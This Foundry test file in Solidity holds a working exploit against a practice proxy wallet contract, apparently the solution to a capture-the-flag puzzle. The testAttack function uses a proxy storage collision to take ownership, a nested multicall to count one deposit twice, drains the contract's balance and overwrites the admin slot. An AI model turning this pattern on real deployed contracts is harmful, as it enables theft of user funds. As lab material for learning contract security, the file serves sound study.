// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleProxy puzzleProxy;
    PuzzleWallet puzzleWallet;

    address alice = makeAddr("alice");

    function setUp() public {
        vm.startPrank(alice);

        puzzleWallet = new PuzzleWallet();
        puzzleProxy = new PuzzleProxy(alice, address(puzzleWallet), "");

        vm.stopPrank();

        deal(address(puzzleProxy), 1 ether);
    }

    function testAttack() public {
        assertEq(puzzleProxy.admin(), alice);
        assertEq(address(puzzleProxy).balance, 1 ether);

        puzzleProxy.proposeNewAdmin(address(this));
        PuzzleWallet(address(puzzleProxy)).addToWhitelist(address(this));

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, depositSelector);

        PuzzleWallet(address(puzzleProxy)).multicall{value: 1 ether}(calls);
        assertEq(PuzzleWallet(address(puzzleProxy)).balances(address(this)), 2 ether);

        PuzzleWallet(address(puzzleProxy)).execute(address(this), 2 ether, "");
        PuzzleWallet(address(puzzleProxy)).setMaxBalance(uint256(uint160(address(this))));

        assertEq(puzzleProxy.admin(), address(this));
    }

    receive() external payable {}
}
